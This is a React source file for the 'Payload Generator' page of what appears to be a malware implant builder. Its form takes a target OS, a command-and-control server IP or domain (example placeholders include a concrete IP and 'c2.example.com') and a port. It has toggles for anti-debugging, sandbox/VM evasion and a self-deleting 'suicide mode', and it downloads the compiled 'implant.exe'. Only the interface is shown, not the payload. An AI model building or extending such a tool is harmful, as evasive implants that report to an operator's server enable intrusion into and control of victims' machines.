import { useState } from "react";
import { Download, Check, ChevronDown } from "lucide-react";
import axios from "axios";

const axiosInstance = axios.create({
    withCredentials: true,
});

export default function PayloadGenerator() {
    const [status, setStatus] = useState<"idle" | "processing" | "success" | "error">("idle");
    const [errorMessage, setErrorMessage] = useState("");
    
    // Form States
    const [osTarget, setOsTarget] = useState("");
    const [ip, setIp] = useState("");
    const [port, setPort] = useState<number | "">("");
    const [antiDebug, setAntiDebug] = useState(false);
    const [antiVm, setAntiVm] = useState(false);
    const [suicide, setSuicide] = useState(false);

    const handleSave = async () => {
        setStatus("processing");
        setErrorMessage("");

        if (!osTarget || !ip || !port) {
            setStatus("error");
            setErrorMessage("Please fill in Target OS, Server IP, and Port before compiling.");
            return;
        }

        const payloadConfig = {
            os_target: osTarget,
            ip,
            port: Number(port),
            anti_debug: antiDebug,
            anti_vm: antiVm,
            suicide
        };

        try {
            const response = await axiosInstance.post('/api/payload/generate', payloadConfig, {
                responseType: 'blob'
            });

            const url = window.URL.createObjectURL(new Blob([response.data]));
            const a = document.createElement('a');
            a.href = url;
            a.download = osTarget === 'windows' ? 'implant.exe' : 'implant_client';
            document.body.appendChild(a);
            a.click();
            a.remove();
            window.URL.revokeObjectURL(url);
            
            setStatus("success");
            // Kembalikan ke idle setelah 3 detik
            setTimeout(() => setStatus("idle"), 3000);
        } catch (error: unknown) {
            setStatus("error");
            if (axios.isAxiosError(error) && error.response && error.response.data instanceof Blob) {
                const text = await error.response.data.text();
                setErrorMessage(text);
            } else if (error instanceof Error) {
                setErrorMessage(error.message);
            } else {
                setErrorMessage("Failed to generate payload");
            }
        }
    };

    return (
        <div className="flex flex-col px-6 md:px-8 py-8 w-full h-[calc(100vh-1px)] overflow-y-auto custom-scrollbar">
            {/* HEADER */}
            <div className="flex justify-between w-full border-b border-green mb-9">
                <h1 className="text-2xl sm:text-3xl font-semibold text-green pb-5">
                    Payload Generator
                    <span className="inline-block w-3 h-3 rounded-full bg-green ml-2 animate-pulse shadow-[0_0_10px_rgba(16,185,129,0.8)]"></span>
                </h1>
            </div>

            <div className="border border-green/30 rounded-[10px] p-8 max-w-full bg-black">
                <div className="space-y-6">
                    <div>
                        <label className="block text-green text-sm mb-2">Target OS</label>
                        <div className="relative">
                            <select 
                                value={osTarget}
                                onChange={(e) => setOsTarget(e.target.value)}
                                className={`w-full bg-black border border-green/50 rounded-lg p-3 outline-none focus:border-green transition-all appearance-none cursor-pointer ${osTarget === "" ? "text-green/50" : "text-white"}`}
                            >
                                <option value="" disabled hidden>-- Select Target OS --</option>
                                <option value="windows">Windows (x86_64)</option>
                                <option value="linux">Linux (x86_64)</option>
                            </select>
                            <div className="absolute right-4 top-0 bottom-0 flex items-center justify-center pointer-events-none">
                                <ChevronDown size={16} className="text-green" />
                            </div>
                        </div>
                    </div>

                    <div>
                        <label className="block text-green text-sm mb-2">Server IP / Domain</label>
                        <input
                            type="text"
                            value={ip}
                            placeholder="e.g., 103.246.107.125 or c2.example.com"
                            onChange={(e) => setIp(e.target.value)}
                            className="w-full bg-black border border-green/50 rounded-lg p-3 text-white outline-none focus:border-green transition-all placeholder:text-green/30"
                        />
                    </div>

                    <div>
                        <label className="block text-green text-sm mb-2">Port</label>
                        <div className="relative">
                            <input
                                type="number"
                                value={port === "" ? "" : port}
                                placeholder="e.g., 8080"
                                onChange={(e) => {
                                    const val = e.target.value;
                                    setPort(val === "" ? "" : parseInt(val));
                                }}
                                className="w-full bg-black border border-green/50 rounded-lg p-3 text-white outline-none focus:border-green transition-all appearance-none [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none m-0 placeholder:text-green/30"
                            />
                            <div className="absolute right-4 top-0 bottom-0 flex flex-col items-center justify-center gap-[3px]">
                                <button type="button" onClick={() => setPort(p => (p === "" ? 1 : p + 1))} className="text-white hover:text-green transition-colors focus:outline-none flex justify-center">
                                    <svg width="8" height="4" viewBox="0 0 12 6" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M1 5L6 1L11 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                                    </svg>
                                </button>
                                <div className="w-[3px] h-[3px] bg-white rounded-full"></div>
                                <button type="button" onClick={() => setPort(p => (p === "" ? 0 : Math.max(0, p - 1)))} className="text-white hover:text-green transition-colors focus:outline-none flex justify-center">
                                    <svg width="8" height="4" viewBox="0 0 12 6" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M1 1L6 5L11 1" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                                    </svg>
                                </button>
                            </div>
                        </div>
                    </div>

                    <div className="bg-[#050A07] border border-green/20 rounded-lg p-6 space-y-4 mt-6">
                        <label className="flex items-center gap-3 cursor-pointer group">
                            <div className="relative flex items-center justify-center">
                                <input 
                                    type="checkbox" 
                                    checked={antiDebug}
                                    onChange={(e) => setAntiDebug(e.target.checked)}
                                    className="peer appearance-none w-4 h-4 border border-green/50 rounded-sm bg-transparent checked:bg-[#002b11] checked:border-green transition-all cursor-pointer" 
                                />
                                <Check size={12} className="absolute text-green opacity-0 peer-checked:opacity-100 pointer-events-none" strokeWidth={3} />
                            </div>
                            <span className="text-green text-sm">Enable Anti-Debugging</span>
                        </label>
                        <label className="flex items-center gap-3 cursor-pointer group">
                            <div className="relative flex items-center justify-center">
                                <input 
                                    type="checkbox" 
                                    checked={antiVm}
                                    onChange={(e) => setAntiVm(e.target.checked)}
                                    className="peer appearance-none w-4 h-4 border border-green/50 rounded-sm bg-transparent checked:bg-[#002b11] checked:border-green transition-all cursor-pointer" 
                                />
                                <Check size={12} className="absolute text-green opacity-0 peer-checked:opacity-100 pointer-events-none" strokeWidth={3} />
                            </div>
                            <span className="text-green text-sm">Enable Anti-VM / Sandbox Evasion</span>
                        </label>
                        <label className="flex items-center gap-3 cursor-pointer group">
                            <div className="relative flex items-center justify-center">
                                <input 
                                    type="checkbox" 
                                    checked={suicide}
                                    onChange={(e) => setSuicide(e.target.checked)}
                                    className="peer appearance-none w-4 h-4 border border-green/50 rounded-sm bg-transparent checked:bg-[#002b11] checked:border-green transition-all cursor-pointer" 
                                />
                                <Check size={12} className="absolute text-green opacity-0 peer-checked:opacity-100 pointer-events-none" strokeWidth={3} />
                            </div>
                            <span className="text-green text-sm">Enable Suicide Mode ( Only work when Anti - VM / Sandbox is enabled or Anti - Debugging is enabled )</span>
                        </label>

                        <div className="pt-6 mt-6">
                            <button 
                                onClick={handleSave}
                                disabled={status === "processing"}
                                className={`w-full bg-black border border-green/50 text-green py-3 rounded-lg flex items-center justify-center gap-2 transition-all font-semibold ${status === "processing" ? "opacity-50 cursor-not-allowed" : "hover:bg-green hover:text-black"}`}
                            >
                                <Download size={20} />
                                Compile & Download
                            </button>

                            {status === "processing" && (
                                <div className="mt-4 w-full bg-black border border-yellow-500 rounded-lg p-6 flex justify-center items-center">
                                    <p className="text-yellow-500 text-sm font-medium animate-pulse">Compiling payload in the background... Please wait (this takes time).</p>
                                </div>
                            )}

                            {status === "success" && (
                                <div className="mt-4 w-full bg-black border border-green rounded-lg p-6 flex justify-center items-center gap-3">
                                    <Check className="text-green" size={20} strokeWidth={3} />
                                    <p className="text-green text-sm font-medium">Generation complete! Download started.</p>
                                </div>
                            )}
                            
                            {status === "error" && (
                                <div className="mt-4 w-full bg-black border border-red-500 rounded-lg p-6 flex justify-center items-center gap-3">
                                    <p className="text-red-500 text-sm font-medium">❌ Compilation Error: {errorMessage}</p>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
